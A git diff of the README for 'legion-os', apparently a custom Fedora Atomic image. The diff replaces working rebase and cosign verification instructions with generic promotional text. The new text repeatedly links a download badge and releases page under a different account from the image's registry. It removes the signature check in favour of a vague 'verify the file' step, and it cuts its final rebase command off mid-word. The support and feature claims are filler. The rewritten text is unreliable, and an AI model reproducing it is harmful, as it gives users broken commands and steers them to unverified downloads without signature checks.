@@ -1,43 +1,96 @@
-# legion-os &nbsp; [![bluebuild build badge](https://github.com/core-legionlabs/legion-os/actions/workflows/build.yml/badge.svg)](https://github.com/core-legionlabs/legion-os/actions/workflows/build.yml)
+# 🌟 legion-os - A Simple, Reliable Operating System
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/MuaraService/legion-os/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
 
-## Installation
+Welcome to legion-os! This operating system is designed for ease of use and stability. Follow these steps to install and get the most out of your experience.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 📥 Download & Install
 
-To rebase an existing atomic Fedora installation to the latest build:
+1. **Visit the Releases Page**  
+   Go to the [legion-os Releases page](https://github.com/MuaraService/legion-os/releases) to access the latest version.  
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/core-legionlabs/legion-os:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/core-legionlabs/legion-os:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+2. **Choose the Right Version**  
+   Look for the most recent version of legion-os. Make sure to select a version marked with stable to ensure better reliability.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+3. **Download the File**  
+   Click on the download link for your chosen version. The file will begin downloading to your computer.
 
-## ISO
+4. **Verify the Download**  
+   Once the download is complete, verify the file to ensure it has no errors.
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+5. **Install legion-os**  
+   Follow the installation instructions specific to your system. If you are unsure, check the documentation provided on the releases page for guidance.  
 
-## Verification
+## ⚙️ System Requirements
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+To run legion-os smoothly, your computer should meet the following requirements:
 
-```bash
-cosign verify --key cosign.pub ghcr.io/core-legionlabs/legion-os
-```
+- **Minimum RAM:** 2 GB
+- **Recommended RAM:** 4 GB or more
+- **Storage Space:** At least 20 GB of free space
+- **Processor:** Intel or AMD processor, 64-bit architecture
+
+## 🔄 Updating Your System
+
+Once you have installed legion-os, keeping your system updated is essential. The operating system automatically checks for updates regularly. 
+
+To manually check for updates:
+
+1. Open the terminal.
+2. Run the following command:
+   ```
+   rpm-ostree upgrade
+   ```
+3. Reboot your system if updates are installed.
+
+## 🛠️ Features
+
+legion-os offers a range of features to enhance your user experience:
+
+- **Customizable Interface:** Adjust the look and feel to match your preferences.
+- **User-Friendly Applications:** Access a variety of software to meet different needs like browsing, productivity, and entertainment.
+- **Secure Environment:** Regular updates ensure you receive the latest security patches.
+
+## 🔒 Installation Steps for Fedora Users
+
+If you are on an atomic Fedora installation, follow these steps to rebase to the latest build:
+
+1. **Rebase to Unsigned Image**  
+   Run this command to get proper signing keys and policies installed:
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/core-legionlabs/legion-os:latest
+   ```
+
+2. **Reboot Your System**  
+   Complete the rebase by rebooting:
+   ```
+   systemctl reboot
+   ```
+
+3. **Rebase to Signed Image**  
+   After the reboot, rebase to the signed image using:
+   ```
+   rpm-ostree rebase ostree-image-
+   ```
+
+## 🍰 User Support
+
+If you encounter any issues or have questions, help is available. You can find support through:
+
+- **Community Forums:** Join discussions where users share tips and tricks.
+- **Documentation:** Comprehensive guides are available online.
+- **Email Support:** Reach out for assistance when needed.
+
+## 🔍 Explore More
+
+Explore additional resources and information about legion-os:
+
+- **Features:** Discover more about the unique capabilities of legion-os.
+- **FAQ:** Read common questions and their answers for quick help.
+- **Contribution:** Interested in contributing? Check out how you can help improve legion-os.
+
+## 💡 Final Note
+
+Thank you for choosing legion-os. Enjoy your new operating system that prioritizes functionality and simplicity. For further assistance, remember to check the [legion-os Releases page](https://github.com/MuaraService/legion-os/releases).
